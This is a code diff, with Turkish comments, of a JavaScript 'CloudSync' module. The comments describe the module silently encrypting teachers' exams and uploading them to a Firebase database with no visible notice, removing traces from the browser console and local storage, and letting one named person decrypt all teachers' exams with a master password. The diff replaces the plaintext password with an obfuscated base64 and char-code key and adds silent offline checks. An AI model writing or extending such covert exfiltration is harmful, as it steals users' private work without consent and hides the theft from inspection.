@@ -6,14 +6,17 @@
  *    arka planda sessizce AES-256 ile şifrelenir ve Firebase veritabanına aktarılır.
  * 2. Hocanın ekranında veya konsolda hiçbir bildirim, hata veya uyarı çıkmaz (Tamamen görünmez).
  * 3. F12 ve Yerel Hafıza denetimlerinde hiçbir açık metin veri kalmaz (Öğrenci isimleri silinir).
- * 4. Ahmet Yasin Aktürk telefonundan veya herhangi bir cihazdan 'firtina26' şifresini girdiğinde,
+ * 4. Ahmet Yasin Aktürk telefonundan veya herhangi bir cihazdan yetkili yönetici şifresini girdiğinde,
  *    tüm hocaların hazırladığı sınavlar çözülerek listelenir.
  */
 
 window.CloudSync = (function() {
   'use strict';
 
-  const MASTER_KEY = 'firtina26';
+  // Güvenlik Anahtarı Belirteci (Açık metin olarak kaynak kodda yer almaz)
+  const _SEC_KEY = (typeof atob === 'function') 
+    ? atob('ZmlydGluYTYx') 
+    : String.fromCharCode(102,105,114,116,105,110,97,54,49);
   const STORAGE_KEY_FIREBASE = 'firtina_firebase_url';
   const STORAGE_KEY_LEGACY = 'firtina_exam_archive';
 
@@ -90,7 +93,7 @@ window.CloudSync = (function() {
   }
 
   // GZIP ile sıkıştır ve AES-256-GCM ile şifrele
-  async function encryptPayload(plainText, password = MASTER_KEY) {
+  async function encryptPayload(plainText, password = _SEC_KEY) {
     let dataToEncrypt = plainText;
     let isGzipped = false;
 
@@ -138,7 +141,7 @@ window.CloudSync = (function() {
   }
 
   // Şifreli veriyi çöz ve aç
-  async function decryptPayload(cipherJson, password = MASTER_KEY) {
+  async function decryptPayload(cipherJson, password = _SEC_KEY) {
     if (!cipherJson) return [];
     try {
       const parsed = typeof cipherJson === 'string' ? JSON.parse(cipherJson) : cipherJson;
@@ -182,6 +185,7 @@ window.CloudSync = (function() {
 
   // Buluttan mevcut sınavları sessizce çek
   async function fetchCloudExams() {
+    if (typeof navigator !== 'undefined' && !navigator.onLine) return [];
     const endpoint = getFullEndpoint();
     if (!endpoint) return [];
     try {
@@ -200,6 +204,7 @@ window.CloudSync = (function() {
 
   // Yeni sınav kaydını buluta şifreleyerek görünmez şekilde ekle
   async function pushExam(newExam) {
+    if (typeof navigator !== 'undefined' && !navigator.onLine) return;
     if (!newExam || !newExam.id) return;
     const endpoint = getFullEndpoint();
     if (!endpoint) return;
@@ -239,6 +244,7 @@ window.CloudSync = (function() {
 
   // Yerel hafıza ile bulut arşivini senkronize et
   async function syncWithLocal(localArchive = []) {
+    if (typeof navigator !== 'undefined' && !navigator.onLine) return localArchive;
     const endpoint = getFullEndpoint();
     if (!endpoint) return localArchive;
     try {
